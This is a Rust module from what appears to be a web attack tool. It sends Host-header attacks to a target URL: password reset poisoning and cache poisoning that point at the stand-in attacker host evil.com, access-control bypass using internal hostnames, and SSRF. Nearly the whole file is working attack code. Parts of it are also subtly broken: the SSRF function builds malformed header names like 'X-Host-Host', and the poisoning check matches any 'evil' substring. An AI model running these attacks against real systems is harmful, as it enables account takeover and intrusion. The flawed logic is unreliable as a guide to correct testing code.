use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(
            reqwest::header::HeaderMap::from_iter([(
                reqwest::header::AUTHORIZATION,
                reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
            )]),
        );
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

pub async fn password(
    url: &str,
    token: Option<&str>,
    timeout: u64,
    email: &str,
) -> anyhow::Result<()> {
    println!("{} Host Header — Password Reset Poisoning", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Email: {}", "[*]".cyan().bold(), email);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        ("Direct override", "evil.com"),
        ("Path-based", "target.com/evil.com"),
        ("Subdomain", "evil.target.com"),
        ("@ bypass", "target.com@evil.com"),
        ("Double host", "target.com\r\nHost: evil.com"),
        ("X-Forwarded-Host", "target.com"),
        ("X-Host header", "target.com"),
        ("X-Forwarded-Server", "target.com"),
        ("X-Original-Host", "target.com"),
        ("Referrer-based", "https://evil.com/reset"),
    ];

    for (name, host_value) in &payloads {
        let mut req = client.post(url).body(format!("email={}", email));
        match *name {
            "X-Forwarded-Host" => { req = req.header("X-Forwarded-Host", "evil.com"); }
            "X-Host header" => { req = req.header("X-Host", "evil.com"); }
            "X-Forwarded-Server" => { req = req.header("X-Forwarded-Server", "evil.com"); }
            "X-Original-Host" => { req = req.header("X-Original-Host", "evil.com"); }
            "Referrer-based" => { req = req.header("Referer", "https://evil.com/reset"); }
            _ => { req = req.header("Host", *host_value); }
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default();
                let poisoned = body.contains("evil.com") || body.contains("evil");
                let status_str = if poisoned { "POISONED".red().bold().to_string() } else { "ok".to_string() };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, status_str);
                if poisoned {
                    println!("    {} Reset link points to attacker host!", ">".red().bold());
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".cyan(), name);
            }
        }
    }

    println!("\n{} Password reset poisoning test complete.", "[*]".cyan().bold());
    println!("{} Check if reset email links point to attacker-controlled host.", "[*]".cyan().bold());
    Ok(())
}

pub async fn cache(
    url: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} Host Header — Cache Poisoning", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let headers_to_test = [
        ("X-Forwarded-Host", "evil.com"),
        ("X-Host", "evil.com"),
        ("X-Forwarded-Server", "evil.com"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
        ("X-Forwarded-Proto", "https"),
        ("X-Original-Host", "evil.com"),
        ("Forwarded", "host=evil.com"),
    ];

    for (header_name, header_value) in &headers_to_test {
        println!("{} Testing {} header...", "[*]".cyan().bold(), header_name);

        let resp1 = client.get(url).header(*header_name, *header_value).send().await;
        let (status1, body1) = match resp1 {
            Ok(r) => { let s = r.status(); let b = r.text().await.unwrap_or_default(); (s, b) }
            Err(_) => { println!("  {} Request failed.", "*".red()); continue; }
        };

        let reflected = body1.contains("evil.com") || body1.contains(header_value);
        if reflected {
            println!("  {} [+] Reflected in response! Checking cache...", "[+]".green().bold());

            let resp2 = client.get(url).send().await;
            if let Ok(r) = resp2 {
                let body2 = r.text().await.unwrap_or_default();
                let cached = body2.contains("evil.com") || body2.contains(header_value);
                if cached {
                    println!("  {} [HIGH] Cache poisoned! Subsequent request returns poisoned content!", "[!]".red().bold());
                } else {
                    println!("  {} Reflected but not cached.", "[-]".yellow().bold());
                }
            }
        } else {
            println!("  {} Not reflected (status {}).", "[-]".dimmed(), status1);
        }
    }

    println!("\n{} Cache poisoning test complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn access(
    url: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} Host Header — Access Control Bypass", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let tests = [
        ("Internal localhost", "localhost"),
        ("Internal 127.0.0.1", "127.0.0.1"),
        ("Internal 10.x", "10.0.0.1"),
        ("Internal 192.168", "192.168.1.1"),
        ("Admin vhost", "admin.target.com"),
        ("Internal vhost", "internal.target.com"),
        ("Dev vhost", "dev.target.com"),
        ("Staging vhost", "staging.target.com"),
    ];

    for (name, host) in &tests {
        let resp = client.get(url).header("Host", *host).send().await;
        match resp {
            Ok(r) => {
                let status = r.status();
                let body = r.text().await.unwrap_or_default();
                let body_len = body.len();
                let interesting = status.as_u16() == 200 || body.contains("admin") || body.contains("internal") || body.contains("dashboard");
                let status_str = if interesting { "INTERESTING".red().bold().to_string() } else { "ok".to_string() };
                println!("  {} {:25} status={} len={} {}", "*".cyan(), name, status, body_len, status_str);
                if interesting && body_len > 100 {
                    println!("    {} Preview: {}...", ">".cyan(), body.chars().take(150).collect::<String>());
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".cyan(), name);
            }
        }
    }

    println!("\n{} Access control bypass test complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn ssrf(
    url: &str,
    token: Option<&str>,
    timeout: u64,
    target: &str,
) -> anyhow::Result<()> {
    println!("{} Host Header — SSRF via Host Header", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:     {}", "[*]".cyan().bold(), url);
    println!("{} Target:  {}", "[*]".cyan().bold(), target);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        ("Direct", target.to_string()),
        ("With port", format!("{}:80", target)),
        ("With path", format!("{}/admin", target)),
        ("@ bypass", format!("target.com@{}", target)),
        ("Double Host", format!("target.com\r\nHost: {}", target)),
        ("X-Forwarded-Host", target.to_string()),
        ("X-Host", target.to_string()),
    ];

    for (name, host_val) in &payloads {
        let mut req = client.get(url);
        if name.starts_with("X-") {
            let parts: Vec<&str> = name.splitn(2, '-').collect();
            let header = format!("X-{}-Host", parts[1]);
            req = req.header(header.as_str(), host_val.as_str());
        } else {
            req = req.header("Host", host_val.as_str());
        }

        match req.send().await {
            Ok(r) => {
                let status = r.status();
                let body = r.text().await.unwrap_or_default();
                let reached = body.contains(target) || body.contains("metadata") || body.contains("169.254");
                let status_str = if reached { "REACHED".red().bold().to_string() } else { "no".to_string() };
                println!("  {} {:25} status={} target_reached={}", "*".cyan(), name, status, status_str);
                if reached {
                    println!("    {} Response contains target content!", ">".red().bold());
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".cyan(), name);
            }
        }
    }

    println!("\n{} Host header SSRF test complete.", "[*]".cyan().bold());
    Ok(())
}
